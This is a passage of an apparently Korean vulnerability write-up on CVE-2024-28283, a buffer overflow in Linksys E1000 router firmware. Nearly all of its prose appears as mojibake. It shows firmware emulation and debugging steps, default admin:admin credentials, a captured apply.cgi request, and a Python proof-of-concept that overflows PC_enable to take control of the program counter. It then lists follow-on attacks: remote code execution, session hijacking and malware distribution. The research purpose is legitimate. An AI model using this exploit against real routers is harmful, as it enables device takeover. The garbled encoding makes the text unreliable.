highlighter-rouge">sscanf</code>, <code class="language-plaintext highlighter-rouge">sprintf</code>ë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê²ƒì´ ë³´ì¸ë‹¤.</p> <p>ê·¸ëŸ¬ë‚˜ <code class="language-plaintext highlighter-rouge">sscanf</code>ë¥¼ ë³´ë©´ íŒì›¨ì–´ê°€ ì‘ë™ ì¤‘ì¸ ì •ë³´ì‹œìŠ¤í…œ ì™¸ë¶€ì˜ ê°’ì´ í™œìš©ë  ì—¬ì§€ê°€ ë‚®ì•„ ë³´ì¸ë‹¤. <code class="language-plaintext highlighter-rouge">nvram_get</code> í•¨ìˆ˜ëŠ” â€œTMSSS_enableâ€ nvram ì—”íŠ¸ë¦¬ì—ì„œ valueë¥¼ ê°€ì ¸ì˜¤ëŠ”ë°, ë¹„ë¡ ì´ê²Œ user controlled dataì´ì§€ë§Œ <code class="language-plaintext highlighter-rouge">sscanf</code>ì—ì„œ %dë¡œ í•¸ë“¤ë§í•˜ê¸° ë•Œë¬¸ì— RCEë¡œ ì´ì–´ì§ˆ ê°€ëŠ¥ì„±ì´ ë‚®ê¸° ë•Œë¬¸ì´ë‹¤.</p> <p>ë”°ë¼ì„œ <code class="language-plaintext highlighter-rouge">sprintf</code>ì— ì§‘ì¤‘í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>v5ëŠ” 24byte í¬ê¸° ë°°ì—´ì¸ë°, ì„¤ì • íŒŒë¼ë¯¸í„° í‚¤ê°’ì„ ë°ì´í„° ì²˜ë¦¬ íŒŒë¼ë¯¸í„°ë¡œ ì¼ê¸° ë•Œë¬¸ì— user controlled dataì¸ <code class="language-plaintext highlighter-rouge">PC_enable</code>ì˜ valueë¥¼ ë¦¬í„´í•  ê°€ëŠ¥ì„±ì´ ë†’ì€ <code class="language-plaintext highlighter-rouge">get_cgi(â€PC_enableâ€)</code>ì˜ ê°’ì„ ê·¸ëŒ€ë¡œ ë³µì‚¬í•´ ë°›ëŠ”ë‹¤.</p> <p>BOFê°€ ì˜ì‹¬ë˜ëŠ” ì •í™©ì´ë‹¤.</p> <p>ë”°ë¼ì„œ í•¨ìˆ˜ë¥¼ íƒ€ê³  ë“¤ì–´ê°€ë©° ì¶”ì¸¡ì´ ë§ëŠ”ì§€ ë” ì •í™•íˆ ì•Œì•„ë³´ì•˜ë‹¤.</p> <p><br /></p> <p><strong>get_cgi</strong></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2017.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">get_cgi</code> ë‚´ë¶€ì—ì„œ 0ì´ ì•„ë‹Œ ë‹¤ë¥¸ ê°’ì„ ë¦¬í„´í•˜ë ¤ë©´ <code class="language-plaintext highlighter-rouge">get_xss</code>ê°€ ì½œë˜ì–´ì•¼ í•œë‹¤.</p> <p>ëˆˆì¹˜ìƒ <code class="language-plaintext highlighter-rouge">hsearch_r</code>ì—ì„œ v3ê³¼ a1ì„ ê·¼ê±°ë¡œ ê²€ìƒ‰ì„ ìˆ˜í–‰í•´ì„œ, ë³„ ë¬¸ì œ ì—†ìœ¼ë©´ v4ê°€ a1(â€œPC_enableâ€ì˜ ì‹œì‘ì£¼ì†Œ)ë¥¼ ê°€ë¦¬í‚¬ ê²ƒ ê°™ë‹¤.</p> <p><br /></p> <p><strong>get_xss</strong></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2018.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ë³´ì•ˆ ì¡°ì¹˜ì¸ ê²ƒ ê°™ë‹¤. XSS ìœ ë°œí•˜ëŠ” code signatureê°€ ìˆëŠ”ì§€ íŒë‹¨í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì´ëŠ”ë°,</p> <p>ë¦¬í„´ê°’ì´ ìœ ì˜ë¯¸í•œ ê°’ì´ ë˜ê¸° ìœ„í•´ì„œëŠ” if ë¬¸ì´ falseê°€ ë˜ê³  v2ê°€ ë¦¬í„´ë˜ëŠ” í”Œë¡œìš°ê°€ ì§„í–‰ë˜ì–´ì•¼ í•œë‹¤. ì¦‰, XSS ë¬¸ì œê°€ ì—†ëŠ” ì…ë ¥ê°’ì´ì–´ì•¼ í•œë‹¤.</p> <p>ê·¸ë ‡ë‹¤ë©´ ë­ê°€ v2ì— ê°’ì„ í• ë‹¹í•˜ëŠ”ê°€? if ë¬¸ì˜ ê°€ì¥ ë§ˆì§€ë§‰ ì¡°ê±´ì´ë‹¤.</p> <p><br /></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">||</span> <span class="p">(</span><span class="n">v4</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">62</span><span class="p">),</span> <span class="n">v2</span> <span class="o">=</span> <span class="n">a1</span><span class="p">,</span> <span class="n">v4</span><span class="p">)</span> 
<span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">v5</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="s">"&lt;&amp;nbsp;&gt;"</span><span class="p">),</span> <span class="n">v2</span> <span class="o">=</span> <span class="n">a1</span><span class="p">,</span> <span class="o">!</span><span class="n">v5</span><span class="p">)</span>
</code></pre></div></div> <p><br /></p> <p>ìœ„ ì¡°ê±´ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ê±°ì¹˜ê³  ë‚˜ë©´ v2ì—ëŠ” a1ì´ ì €ì¥ëœë‹¤.</p> <p>ì¦‰, <code class="language-plaintext highlighter-rouge">get_cgi</code>ì— ì¸ìˆ˜ë¡œ ì¤€ <code class="language-plaintext highlighter-rouge">PC_enable</code>ì˜ ì‹œì‘ì£¼ì†Œê°€ ê·¸ëŒ€ë¡œ <code class="language-plaintext highlighter-rouge">pc_change_act</code>ì˜ ë³€ìˆ˜ cgiì— ë“¤ì–´ê°„ë‹¤.</p> <p>í•´ë‹¹ ë°”ì´ë„ˆë¦¬(httpd)ëŠ” gcc-compiled c/c++ ë°”ì´ë„ˆë¦¬ë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2019.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="40%" height="40%" /> <img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2020.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="40%" height="40%" /></p> <p><br /></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2021.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="40%" height="400%" /><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2022.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="40%" height="40%" /></p> <p><br /></p> <p>ìœ„ì™€ ê°™ì´ IDAì—ì„œ í™•ì¸ëœ ì •ë³´ì™€ ì»´íŒŒì¼ëŸ¬ì˜ convention ë“±ì„ ê³ ë ¤í–ˆì„ ë•Œ,</p> <p><code class="language-plaintext highlighter-rouge">30byte+RET addr+shellcode</code> ë¡œ ì£¼ë©´ ìµìŠ¤í”Œë¡œì‡ì´ ë  ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤. ë¬¼ë¡  RCEë¥¼ í•˜ê³  ì‹¶ìœ¼ë©´ NX-bit ë“±ì´ ê±¸ë ¤ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•˜ì§€ë§Œ</p> <p>PoCëŠ” <code class="language-plaintext highlighter-rouge">30byte+RET addr taint(4byte)</code>ê¹Œì§€ë§Œ í•˜ë©´ ë  ê²ƒ ê°™ë‹¤.</p> <p><br /></p> <p>ë¬¼ë¡  ì •ì ìœ¼ë¡œ ì•Œì•„ë‚¼ ìˆ˜ ìˆëŠ” ë°ì—ëŠ” í•œê³„ê°€ ìˆë‹¤. ë”°ë¼ì„œ ìœ„ ì„¹ì…˜ì—ì„œ ì„œìˆ í–ˆë˜ ì¶”ì¸¡ì„ í™•ì‹¤í•˜ê²Œ í•˜ë ¤ë©´, ë™ì ìœ¼ë¡œ ë¶„ì„í•´ì•¼ í•œë‹¤.</p> <p>ë³„ë‹¤ë¥¸ dynamic analysis preventionì´ ì•ˆ ê±¸ë ¤ ìˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì´ê¸° ë•Œë¬¸ì—, ì € ìœ„ì¹˜ì— bpë¥¼ ê±¸ê³  ì‹¤í–‰í•œ ë‹¤ìŒ ë°ì´í„°ê°€ ì˜¤ê°€ëŠ” ë¶€ë¶„ì„ ë³¸ë‹¤.</p> <p><br /></p> <hr /> <p>ì‚¬ì¡±ì´ì§€ë§Œ, nvram_get í•¨ìˆ˜ ìì²´ì—ì„œ ì·¨ì•½ì ì´ ë°œìƒí•  ì—¬ì§€ê°€ ë†’ì•„ ë³´ì—¬ ê°œì¸ì ìœ¼ë¡œ ê²€ìƒ‰í•´ ë´¤ëŠ”ë°, ë°œìƒí•œ ì´ë ¥ì´ ìˆì—ˆë‹¤. ì¶”ê°€ë¡œ, <code class="language-plaintext highlighter-rouge">apply.cgi</code> url ë˜í•œ ì•„ë˜ ì·¨ì•½ì ì—ì„œë„ ì·¨ì•½í–ˆë˜ urlì´ì—ˆë‹¤.</p> <blockquote> <p>CVE-2018-3953</p> <p>Devices in the Linksys ESeries line of routers (Linksys E1200 Firmware Version 2.0.09 and Linksys E2500 Firmware Version 3.0.04) are susceptible to OS command injection vulnerabilities due to improper filtering of data passed to and retrieved from NVRAM. Data entered into the â€˜Router Nameâ€™ input field through the web portal is submitted to apply.cgi as the value to the â€˜machine_nameâ€™ POST parameter. When the â€˜preinitâ€™ binary receives the SIGHUP signal, it enters a code path that continues until it reaches offset 0x0042B5C4 in the â€˜start_lltdâ€™ function. <strong>Within the â€˜start_lltdâ€™ function, a â€˜nvram_getâ€™ call is used to obtain the value of the user-controlled â€˜machine_nameâ€™ NVRAM entry. This value is then entered directly into a command intended to write the host name to a file and subsequently executed.</strong></p> </blockquote> <p>KARONTEë¥¼ ëŒë ¤ë„ httpdëŠ” border binary ë¡œ ì¹˜ì§€ ì•Šì•„ ë¶„ì„ ëŒ€ìƒìœ¼ë¡œ ë³´ì§€ ì•Šì•˜ë‹¤. ì¦‰, KARONTEë¡œëŠ” ë¬¸ì œ ì·¨ì•½ì ì„ ì°¾ì•„ë‚¼ ìˆ˜ ì—†ì—ˆë‹¤.</p> <p>ë”°ë¼ì„œ ë¬¸ì œ ì·¨ì•½ì ì´ ì–´ë–¤ ê²½ë¡œë¡œ ë°œê²¬ëëŠ”ì§€ ê³ ë¯¼í•˜ê³  ìˆì—ˆëŠ”ë°, Linksys ë¼ìš°í„° E ì‹œë¦¬ì¦ˆì—ì„œ ë°œìƒí–ˆë˜ ì·¨ì•½ì  ì´ë ¥ì„ ëª¨ë‘ ëª¨ì€ ë‹¤ìŒ í•´ë³¼ ë§Œí•œ ê³³ì„ ê³µëµí•˜ëŠ” ì •ì„ì ì¸ ë°©ì‹ì„ ì“´ ê²ƒ ê°™ì•˜ë‹¤.</p> <hr /> <p><br /></p> <h2 id="12-ìµìŠ¤í”Œë¡œì‡-í™˜ê²½-ì…‹ì—…">1.2. ìµìŠ¤í”Œë¡œì‡ í™˜ê²½ ì…‹ì—…</h2> <p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a> ì—ì„œ Firmware Emulatorë¥¼ ë‹¤ìš´ë°›ì•„ ì§ì ‘ íŒì›¨ì–´ë¥¼ êµ¬ë™í•˜ê³ , pc_change_act ë¥¼ ì°¸ì¡°í•˜ëŠ” ê¸°ëŠ¥ì— ì§ì ‘ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ ë³´ëŠ” ê²ƒì„ ëª©ì ìœ¼ë¡œ í•œë‹¤.</p> <p>ì—ë®¬ë ˆì´í„° ë‹¤ìš´ë¡œë“œ í›„ ë ˆí¬ì— ë‚˜ì˜¨ ëŒ€ë¡œ ì„¤ì •ì„ ëë‚´ê³ , ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í–ˆë‹¤.</p> <p><code class="language-plaintext highlighter-rouge">$ sudo ./run.sh -c linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin</code></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2023.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ ê²°ê³¼, 192.168.1.1ì— íŒì›¨ì–´ìƒì˜ ì›¹ì„œë²„ê°€ êµ¬ë™ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.</p> <p>ì´ì œ ë””ë²„ê¹…ì„ ìœ„í•´ ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í–ˆë‹¤.</p> <p><code class="language-plaintext highlighter-rouge">$ sudo ./run.sh -d linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin</code></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2024.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì •ìƒ êµ¬ë™ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.</p> <p>ì´ì œ run gdbserver ì˜µì…˜ì„ ì„ íƒí•´ target pidì— httpdì˜ pidë¥¼ ì…ë ¥í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2025.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>gdb-multiarchë¥¼ ì„¤ì¹˜í•´ ìœ„ ì‚¬ì§„ì— ë‚˜ì˜¨ ëŒ€ë¡œì˜ instructionì„ ë”°ëë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2026.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>pc_change_actì— ì ‘ê·¼í•˜ëŠ” ìš”ì²­ì„ ì°¾ê³  ì‹¶ì–´ì„œ, gdbì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì¤‘ë‹¨ì ì„ ì„¤ì •í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2027.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì´ì œ cë¡œ ì‹¤í–‰ë˜ë„ë¡ í•´ ë‘ê³ , ì›¹ì„œë²„ì— ì ‘ê·¼í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2028.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>id, pwëŠ” cisco ì´ˆê¸° id:pwê°’ì¸ admin:admin í˜¹ì€ cisco:ciscoë¥¼ ë„£ì–´ë³´ë©´ ë¡œê·¸ì¸ë  ê²ƒì´ë‹¤.</p> <p>admin:adminì´ì—ˆë‹¤.</p> <p>ìµìŠ¤í”Œë¡œì‡ íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ë‹¤ì‹œ ë³´ì.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì¦‰, í•´ë‹¹ í•¨ìˆ˜ì— ë‚ ì•„ê°€ëŠ” ìš”ì²­ì€ ë¬´ì¡°ê±´ ìœ„ì˜ strings ì¤‘ í•˜ë‚˜ë¥¼ í¬í•¨í•  ìˆ˜ë°–ì— ì—†ë‹¤.</p> <p>ë”°ë¼ì„œ, ì›¹ì„œë²„ë¥¼ êµ¬ì„±í•˜ëŠ” íŒŒì¼ë“¤ì— ëŒ€í•´ <code class="language-plaintext highlighter-rouge">PC_enable</code> stringì´ ì¡´ì¬í•˜ëŠ”ì§€ ì „ìˆ˜ì¡°ì‚¬ë¥¼ ì§„í–‰í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2029.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ ê²°ê³¼, <code class="language-plaintext highlighter-rouge">GuestNetworkSetting.asp</code>ì— í•´ë‹¹ ë¬¸ìì—´ì´ ì¡´ì¬í•¨ì„ í™•ì¸í–ˆë‹¤.</p> <p>ë”°ë¼ì„œ <code class="language-plaintext highlighter-rouge">192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55</code> ì— ì ‘ê·¼í•´ì„œ, ì•„ë¬´ ë‚´ìš©ì´ë‚˜ ë°”ê¾¼ ë‹¤ìŒ â€˜Save Settingsâ€™ë¥¼ í´ë¦­í•´ ë³´ì•˜ë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2030.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ìœ„ì™€ ê°™ì´ ê¸°ì¡´ì— ì„¤ì •í•´ ë‘ì—ˆë˜ bpì— ê±¸ë¦¼ì„ í™•ì¸í–ˆë‹¤. ì¦‰, íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ì •ìƒì ìœ¼ë¡œ ì°¸ì¡°í•¨ì„ í™•ì¸í–ˆë‹¤.</p> <p><br /></p> <h2 id="13-ìµìŠ¤í”Œë¡œì‡-ì„¤ê³„">1.3. ìµìŠ¤í”Œë¡œì‡ ì„¤ê³„</h2> <p>ì´ì œ ê³µê²© ì§€ì ì„ ì•Œì•˜ìœ¼ë‹ˆ ìµìŠ¤í”Œë¡œì‡ì„ ì„¤ê³„í•  ì°¨ë¡€ë‹¤.</p> <p>ìµìŠ¤ íŒ¨í‚·ì„ ì„¤ê³„í•˜ê¸° ìœ„í•´ ì •ìƒ ìš”ì²­ì˜ í¬ë§·ì„ í™•ì¸í–ˆë‹¤.</p> <p>í•´ë‹¹ ìš”ì²­ì´ ì–´ë–¤ í¬ë§·ìœ¼ë¡œ ë‚ ì•„ê°€ëŠ”ì§€ ì•Œê¸° ìœ„í•´ tcpdumpë¥¼ ì‚¬ìš©í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2031.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì€ íŒ¨í‚· ë‚´ìš©ì„ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.(ê°œë°œì ë„êµ¬ë¡œë„ í™•ì¸ ê°€ëŠ¥í•˜ë‚˜, ê°œë°œì ë„êµ¬ë¡œëŠ” íŒ¨í‚· ë‚´ìš©ì„ ì˜ˆì˜ê²Œ ì–»ê¸° ì–´ë ¤ì›Œ rawdataë¥¼ ì§ì ‘ ì–»ì—ˆë‹¤)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /apply.cgi;session_id=a5603bc78a2241abfe43afefbb587c55 HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 140
Cache-Control: max-age=0
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

submit_button=GuestNetworkSetting&amp;change_action=&amp;gui_action=Apply&amp;wait_time=19&amp;submit_type=&amp;del_mac=&amp;gn_lan_ipaddr=4&amp;gn_enable=0&amp;PC_enable=1
</code></pre></div></div> <p><br /></p> <h2 id="14-ìµìŠ¤í”Œë¡œì‡">1.4. ìµìŠ¤í”Œë¡œì‡</h2> <blockquote> <p>ìœ„ì™€ ê°™ì´ IDAì—ì„œ í™•ì¸ëœ ì •ë³´ë¥¼ ê³ ë ¤í–ˆì„ ë•Œ,</p> <p>PoCëŠ” <code class="language-plaintext highlighter-rouge">30byte+RET addr taint(4byte)</code>ê¹Œì§€ë§Œ í•˜ë©´ ë  ê²ƒ ê°™ë‹¤.</p> </blockquote> <p>ì•ì„œ ì´ë ‡ê²Œ ë¶„ì„í•œ ë°”ê°€ ìˆê³ , ìœ„ì™€ ê°™ì´ ì •ìƒ íŒ¨í‚·ì˜ í˜•íƒœë„ ì•Œê³  ìˆìœ¼ë‹ˆ ì´ì œ ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ì–´ ë³´ì. ì‹œê°„ì´ ë¶€ì¡±í•´ ê¸°ì¡´ì— ì¡´ì¬í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ í™œìš©í–ˆë‹¤.</p> <p><br /></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ex.py
</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">target</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s">"Enter target IP: "</span><span class="p">)</span>
<span class="n">session_id</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s">"Enter session_id: "</span><span class="p">)</span>

<span class="n">url</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s">"/apply.cgi;session_id="</span><span class="o">+</span><span class="n">session_id</span>
<span class="n">headers</span><span class="o">=</span><span class="p">{}</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"User-Agent"</span><span class="p">]</span><span class="o">=</span><span class="s">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept"</span><span class="p">]</span><span class="o">=</span><span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept-Language"</span><span class="p">]</span><span class="o">=</span> <span class="s">"en-US,en;q=0.5"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Accept-Encoding"</span><span class="p">]</span><span class="o">=</span> <span class="s">"gzip, deflate"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"application/x-www-form-urlencoded"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Origin"</span><span class="p">]</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Connection"</span><span class="p">]</span><span class="o">=</span><span class="s">"close"</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Referer"</span><span class="p">]</span><span class="o">=</span><span class="s">"http://"</span><span class="o">+</span><span class="n">target</span><span class="o">+</span><span class="s">"/apply.cgi;session_id="</span><span class="o">+</span><span class="n">session_id</span>
<span class="n">headers</span><span class="p">[</span><span class="s">"Upgrade-Insecure_Requests"</span><span class="p">]</span><span class="o">=</span><span class="s">"1"</span>

<span class="n">data</span><span class="o">=</span><span class="p">{}</span>
<span class="n">data</span><span class="p">[</span><span class="s">"submit_button"</span><span class="p">]</span><span class="o">=</span><span class="s">"GuestNetworkSetting"</span>
<span class="n">data</span><span class="p">[</span><span class="s">"gui_action"</span><span class="p">]</span><span class="o">=</span><span class="s">"Apply"</span>

<span class="n">pay</span><span class="o">=</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x30</span>	<span class="c1">#dummy
</span><span class="n">pay</span><span class="o">+=</span><span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>		<span class="c1">#return address
</span><span class="n">data</span><span class="p">[</span><span class="s">"PC_enable"</span><span class="p">]</span><span class="o">=</span><span class="n">pay</span>

<span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

</code></pre></div></div> <p><br /></p> <p>ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì•„ë˜ì™€ ê°™ì´ ì‹¤í–‰í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2032.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ê·¸ ê²°ê³¼, gdbì—ì„œ ì •ìƒì ìœ¼ë¡œ í¬ë˜ì‹œê°€ ë°œìƒí•œ ì ì„ í™•ì¸í–ˆë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2033.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2034.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>PCë ˆì§€ìŠ¤í„°(next instructionì„ ê°€ë¦¬í‚¤ëŠ” program counter ë ˆì§€ìŠ¤í„°)ì— <code class="language-plaintext highlighter-rouge">0x42424242</code>, ì¦‰ taintê°€ ì˜ ë“¤ì–´ê°”ë‹¤.</p> <p><br /></p> <h1 id="2-ìµìŠ¤í”Œë¡œì‡ì„-í†µí•´-ê°€ëŠ¥í•œ-ì¹¨í•´-ì‹œë‚˜ë¦¬ì˜¤">2. ìµìŠ¤í”Œë¡œì‡ì„ í†µí•´ ê°€ëŠ¥í•œ ì¹¨í•´ ì‹œë‚˜ë¦¬ì˜¤</h1> <p>í•´ë‹¹ íŒì›¨ì–´ì˜ ìŠ¤íƒê³¼ í™ì€ ì–´ë–¤ ê¶Œí•œìœ¼ë¡œ ëŒì•„ê°€ëŠ” ì¤‘ì¸ì§€ í™•ì¸í•´ ë³´ì•˜ë‹¤.</p> <p><img src="/assets/img/posts/2025-01-27-CVE-2024-28283/image%2035.png" alt="/assets/img/posts/2025-01-27-CVE-2024-28283/image.png" width="80%" height="80%" /></p> <p><br /></p> <p>ì „ë¶€ ì‹¤í–‰ ê¶Œí•œì„ ê°€ì§„ ì±„ë¡œ ëŒì•„ê°„ë‹¤â€¦.</p> <ul> <li>ì„ë² ë””ë“œ ë””ë°”ì´ìŠ¤ ì¹©ì…‹ì˜ ì»´í“¨íŒ… ëŠ¥ë ¥ì„ ê³ ë ¤í–ˆï¿½ï¿½ï¿½ ë•Œ, íŒì›¨ì–´ëŠ” ë†’ì€ í™•ë¥ ë¡œ ASLRì´ ê±¸ë¦¬ì§€ ì•Šì€ í™˜ê²½ì—ì„œ ëŒì•„ê°ˆ ê²ƒì´ë‹¤. <ul> <li>ì¦‰ ê¸°ì´ˆì ì¸ ì‹œìŠ¤í…œ í•´í‚¹ ëŠ¥ë ¥ì´ ìˆë‹¤ë©´ ëˆ„êµ¬ë‚˜ RCEê°€ ê°€ëŠ¥í•˜ë‹¤.</li> </ul> </li> <li>ë˜í•œ, í•´ë‹¹ ë¼ìš°í„°ëŠ” ì ‘ê·¼ ê¶Œí•œì„ ì„¸ì…˜ IDë¡œ êµ¬ë¶„í•˜ê³  ìˆìœ¼ë‚˜ ì„¸ì…˜ IDê°€ ì•„ë˜ì™€ ê°™ì´ GETì˜ íŒŒë¼ë¯¸í„°ë¡œ ë“¤ì–´ì˜¤ê³  ìˆì—ˆìœ¼ë©°, http í†µì‹ ì„ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ íŠ¸ë˜í”½ì„ ë§¤ê°œí•˜ê³  ìˆì—ˆë‹¤. <ul> <li><code class="language-plaintext highlighter-rouge">192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55</code></li> <li>ë”°ë¼ì„œ ì¶©ë¶„íˆ MITM ê³µê²©ì„ í†µí•œ ê´€ë¦¬ì ì„¸ì…˜ íƒˆì·¨ê°€ ê°€ëŠ¥í•˜ë©°, í•´ë‹¹ ë¼ìš°í„°ì—ì„œëŠ” L7ê¹Œì§€ì˜ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” ê´€ê³„ë¡œ Application ë ˆë²¨ì—ì„œ ê°€ëŠ¥í•œ ê³µê²©(ì›¹ ìµìŠ¤í”Œë¡œì‡)ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.</li> </ul> </li> <li>í˜¹ì€ ì•…ì„± íŒŒì¼ ìœ í¬ì§€ë¡œë„ ì‚¬ìš©í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.</li> </ul> <p>ë¬¼ë¡  ì´ì™€ ê°™ì€ ì„¤ì •ì„ ê°€ì§„ 